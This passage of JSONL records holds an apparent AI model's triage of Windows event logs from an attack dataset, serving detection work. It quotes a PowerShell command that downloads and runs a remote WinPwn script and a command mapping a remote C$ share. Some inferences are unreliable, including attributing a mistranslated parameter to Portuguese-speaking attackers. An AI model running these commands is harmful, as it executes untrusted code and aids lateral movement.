The user provided a series of log entries, and I need to determine if they're interesting for investigation. First, I'll look for any suspicious patterns.\n\nI see multiple entries involving 'powershell.exe' with various tasks. One entry stands out: the command line includes downloading a script from a GitHub URL. That's a red flag because downloading and executing scripts from external sources is common in attacks. The URL mentioned is from raw.githubusercontent.com, which is often used for hosting code, but if it's a malicious script, that's a problem.\n\nNext, there are several 'Image loaded' events for PowerShell, which might be normal, but when combined with the download, it could indicate that the script is being executed. The files loaded include .dlls from .NET and Windows Defender, which might be legitimate, but the presence of multiple image loads could be part of a larger attack.\n\nThere's also a file created and then immediately deleted in the Temp directory. That's suspicious because attackers often create temporary files to execute malicious code and then delete them to avoid leaving evidence.\n\nThe 'Registry value set' events might indicate changes to the system's registry, which can be part of persistence mechanisms. However, without more context, it's hard to say for sure. But combined with the PowerShell activity, it adds to the suspicion.\n\nThe 'Pipe Created' event might be related to inter-process communication, which isn't inherently malicious, but in the context of other suspicious activities, it could be part of a larger attack.\n\nThe 'sppsvc.exe' loading 'taskschd.dll' might be normal, but again, without more context, it's hard to tell. However, the majority of the events are related to PowerShell, which is a common vector for attacks.\n\nPutting this all together: the download of a script from an external source, followed by execution, creation and deletion of temporary files, multiple image loads, and registry changes all point towards potential malicious activity. Even though some elements could be legitimate, the combination makes this batch interesting for investigation.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell processes executing suspicious commands, including downloading and executing a script from a GitHub URL, creating and deleting temporary files, and loading various DLLs, which may indicate malicious activity.\",\n  \"CONFIDENCE\": 0.85\n}"}
{"file":"data\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let's take a look at these logs. The user wants to know if this batch of events is interesting for investigation. So, first, I need to go through each event and see what's happening.\n\nStarting with the first entry: svchost.exe setting a registry value. That's normal for some system processes, but maybe not suspicious on its own. Then sppsvc.exe creating a file in the System32\\spp\\store\\2.0\\cache directory. That seems legitimate too, as sppsvc is related to Software Protection Platform, which handles license keys. The file path looks okay.\n\nNext, there's a lot of activity from powershell.exe. Multiple entries show Process Accessed, Registry value set, and Image Loaded events. The command line in one of them is creating a new PSDrive pointing to \\\\Target\\\\C$. That's a red flag because accessing remote drives, especially with UNC paths, can be part of lateral movement or data exfiltration. \n\nAlso, several Image Load events for .NET assemblies like mscoree.dll, clr.dll, and System.Management.Automation.ni.dll. These are normal for PowerShell, but the combination with other events might be significant. Then there's a file created in the Temp directory named __PSScriptPolicyTest_ppfs3is3.jnx.ps1, which is then deleted. Creating and deleting temporary files could be part of an attack, like executing a script and cleaning up evidence.\n\nThe Pipe Created event might be related to inter-process communication, which isn't inherently bad but could be used maliciously. Also, the Registry value set by PowerShell might indicate changes to system settings or persistence mechanisms.\n\nPutting it all together: multiple PowerShell events, including creating a network drive, loading .NET components, creating and deleting temporary files, and registry changes. These could indicate an attacker using PowerShell for malicious activities, such as executing scripts, accessing remote systems, or establishing persistence. The presence of these events together, especially the network drive creation and temp file operations, raises suspicion. However, some of these activities could be legitimate, like script testing or system updates. But given the combination and the use of PowerShell for potentially malicious tasks, it's worth investigating further. So the classification is INTERESTING with medium confidence.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell events indicate potential malicious activity, including creation of a network drive (\\\\Target\\\\C$), loading of .NET assemblies, and temporary file creation\/deletion, which may suggest script-based attacks or lateral movement.\",\n  \"CONFIDENCE\": 0.75\n}"}
{"file":"data\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let's take a look at these logs. The first entry has \"process\" as None and \"winlog\" task as None. That might be a placeholder or an error, but not sure yet. Then, starting from the second entry, there are multiple entries with the same process command line. The command line is using PowerShell to download a script from a GitHub URL. The URL is part of a repository named WinPwn, which sounds suspicious. The script is being downloaded using the WebClient object, which is a common technique in PowerShell for downloading files.\n\nLooking at the command line, after downloading, it's executing the script with \"iex\" (Invoke-Expression). The script name is WinPwn.ps1. The presence of multiple identical entries suggests that this process is repeated several times, which might indicate an automated or persistent activity. The winlog tasks are mostly \"Provider Lifecycle\" and \"Engine Lifecycle,\" which are part of Windows Event Log tasks. However, the repetition of the same command line across multiple events is a red flag.\n\nThen, later entries show another PowerShell command using New-PSDrive to map a network drive. The target is \\\\Target\\\\C$, which might be a remote system's C drive. This could be an attempt to access files on a remote machine, which is suspicious. The repetition of this command multiple times also suggests that this is part of a larger operation, possibly lateral movement within a network.\n\nPutting this together: downloading a malicious PowerShell script from a GitHub repo (which might be a known malicious repository), executing it, and then mapping a network drive to access remote systems. The repetition of these events across multiple log entries indicates that this isn't a one-off event but part of a coordinated attack. The use of PowerShell for these activities is common in post-exploitation phases. The presence of both script downloading and network drive mapping suggests that the attacker is trying to establish persistence and move laterally within the network.\n\nI should also check if the GitHub repository mentioned is known for malicious activity. WinPwn might be a tool used by attackers. Additionally, the use of \"unidade_auxiliar\" in the New-PSDrive command is in Portuguese, which might indicate the attacker's language or the environment where this is happening. However, the presence of both English and Portuguese terms could be due to the command being translated or the environment's configuration.\n\nOverall, the logs show multiple suspicious activities that are repeated, pointing towards a potential security threat. The combination of downloading and executing a script from an external source and mapping network drives are strong indicators of malicious intent.\n<\/think>\n\nThe provided logs indicate **multiple suspicious activities** that strongly suggest a potential **malicious attack** or **malicious insider activity**. Here's a breakdown of the key findings and implications:\n\n---\n\n### **1. Repeated PowerShell Script Download and Execution**\n- **Malicious Activity**: \n  - Multiple entries show the same PowerShell command downloading a script from a GitHub repository (`WinPwn.ps1`) using `Invoke-WebRequest` (via `New-Object Net.WebClient`) and executing it with `Invoke-Expression` (`iex`).\n  - **Script Source**: The script is hosted on a GitHub repository named `WinPwn`, which is **notoriously associated with malicious tools** (e.g., used in red-team exercises or exploitation frameworks).\n  - **Implication**: This is a classic **PowerShell-based attack technique** for downloading and executing payloads. The repetition of this event across multiple logs suggests **persistent or automated activity**.\n\n- **Command Example**:\n  ```powershell\n  powershell.exe & {iex (New-Object Net.WebClient).DownloadString('https:\/\/github.com\/...\/WinPwn.ps1')}\n  ```\n\n---\n\n### **2. Network Drive Mapping to Remote Systems**\n- **Malicious Activity**:\n  - Repeated use of `New-PSDrive` to map a network drive (`g:`) to a remote system's C$ share (`\\\\Target\\C$`).\n  - **Implication**: This is **lateral movement** within a network, allowing the attacker to access files on remote machines (e.g., for data exfiltration, persistence, or further exploitation).\n\n- **Command Example**:\n  ```powershell\n  powershell.exe & {New-PSDrive -name g -psprovider filesystem -unidade_auxiliar \\\\Target\\C$}\n  ```\n\n- **Key Detail**: The use of `unidade_auxiliar` (Portuguese for \"auxiliary unit\") suggests the attacker may be operating in a **Portuguese-speaking environment** or using localized tools.\n\n---\n\n### **3. Log Anomalies**\n- **First Log Entry**: \n  - Contains `process: None` and `winlog.task: None`, which may indicate **incomplete or corrupted log data** or an attempt to mask activity.\n- **Repetition of Events**:\n  - The same commands appear **multiple times**, suggesting **automation, persistence, or repeated attempts** to execute the payload.\n\n---\n\n### **4. Potential Attack Stages**\n- **Initial Compromise**: \n  - The attacker likely gained initial access via phishing, exploit, or other means.\n- **Persistence**:\n  - The repeated PowerShell commands suggest **persistent access** to the system.\n- **Lateral Movement**:\n  - Mapping the network drive (`\\\\Target\\C$`) indicates **movement to other systems** in the network.\n- **Command and Control (C2)**:\n  - The script (`WinPwn.ps1`) may establish a **C2 channel** to exfiltrate data or receive further instructions.\n\n---\n\n### **Recommendations**\n1. **Investigate the Source of the Script**:\n   - Confirm if the GitHub repository (`WinPwn`) is malicious. If so, block access to it.\n2. **Check for Compromised Systems**:\n   - Audit systems where the PowerShell commands were executed for signs of unauthorized access.\n3. **Block Lateral Movement**:\n   - Restrict access to network shares (e.g., `C$`) via firewall rules or group policies.\n4. **Enable PowerShell Logging**:\n   - Monitor PowerShell activity via **PowerShell transcript logging** or **Windows Event Logs** (e.g., Event ID 4688 for process creation).\n5. **Hunt for Indicators of Compromise (IOCs)**:\n   - Look for the script (`WinPwn.ps1`) on disk, network traffic to GitHub, or suspicious registry changes.\n\n---\n\n### **Conclusion**\nThe logs strongly indicate **malicious activity**, including **script execution from an external source** and **lateral movement via network shares**. Immediate investigation and mitigation are required to prevent further compromise."}
{"file":"data\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let me try to figure this out. So, the user provided a bunch of JSONL events, and I need to determine if the entire batch is interesting for investigation. The classification can be either \"INTERESTING\" or \"NOT INTERESTING\" with a justification and confidence level.\n\nLooking at the first event, the process has a command line that uses PowerShell to create a new PSDrive named 'g' pointing to the Target's C$ share. That seems suspicious because creating a PSDrive to a remote machine's C$ share might be part of lateral movement or unauthorized access. The task in the winlog is 'Engine Lifecycle', which I'm not too familiar with, but maybe that's a normal process. However, the command itself looks like it's trying to map a network drive, which could be a red flag.\n\nThen, the next 20 events all have the task 'Execute a Remote Command', but the process and file fields are 'None'. That's odd. If the process is 'None', maybe the events are from a source that doesn't capture process information, or maybe it's a misconfiguration. However, having multiple events with 'Execute a Remote Command' could indicate someone is trying to run commands on a remote system, which is a common attack technique. But if there's no process information, it's harder to tell if it's malicious or just normal operations.\n\nNow, combining all events: the first one is a PowerShell command creating a PSDrive to a remote machine, which might be part of an attack. The rest are multiple remote command executions. Even though some events don't have process details, the combination of the first event and the repeated remote command executions might indicate an ongoing attack. However, I need to check if 'Execute a Remote Command' is a normal task or something that's typically associated with malicious activity. If it's a standard task, maybe it's not interesting. But if it's uncommon, that's a problem.\n\nWait, the first event's command line is using 'New-PSDrive' with a UNC path (\\\\Target\\\\C$), which is a network share. That's a common technique in attacks to access remote systems. Also, the fact that there are so many 'Execute a Remote Command' events might be part of a larger attack, like executing multiple commands on the remote machine. However, without more context, like user accounts, IP addresses, or other indicators, it's a bit tricky.\n\nBut the user wants the classification based on the entire batch. The first event is definitely suspicious. The rest, even though they don't have process info, are multiple remote command executions. If these are from a legitimate process, maybe it's okay, but if they're from unknown sources, that's bad. However, since the process is 'None', it might not be possible to determine. But the presence of multiple 'Execute a Remote Command' tasks could still be a sign of something malicious.\n\nSo, considering the first event's PowerShell command and the repeated remote command executions, even without process details, this might be worth investigating. Therefore, the classification should be 'INTERESTING' with a confidence maybe around 0.75. The justification is that the first event shows a suspicious PowerShell command to map a remote drive, and multiple remote command executions could indicate an attack.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The first event shows a PowerShell command creating a remote PSDrive to a network share (\\\\Target\\\\C$), which is suspicious. Combined with 20 subsequent events indicating 'Execute a Remote Command' tasks, this suggests potential lateral movement or remote code execution activity.\",\n  \"CONFIDENCE\": 0.75\n}"}
